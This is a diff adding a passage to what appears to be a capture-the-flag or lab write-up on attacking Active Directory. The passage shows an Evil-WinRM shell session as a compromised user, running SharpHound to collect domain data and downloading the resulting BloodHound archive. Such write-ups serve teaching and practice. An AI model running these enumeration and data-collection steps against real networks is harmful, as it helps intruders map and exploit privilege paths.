@@ -401,5 +401,29 @@ Also part of the GMSA managers group
 
 Since this user is apart of the remote management users ill get a shell as the user and ill recollect data using sharphound.
 
+```python
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop> .\SharpHound.exe -c all
 
+...[SNIP]...
+
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop> dir
+
+
+    Directory: C:\Users\mark.adams\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          6/7/2026   7:03 PM          41549 20260607190340_BloodHound.zip
+-a----          6/7/2026   7:03 PM           1595 NzBkNGM2ZWYtODFhYy00M2M0LTgzNzMtNmViNTQ1NzJhN2Nk.bin
+-a----          6/7/2026   7:02 PM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop> download 20260607190340_BloodHound.zip
+                                        
+Info: Downloading C:\Users\mark.adams\Desktop\20260607190340_BloodHound.zip to 20260607190340_BloodHound.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop>
+```
 
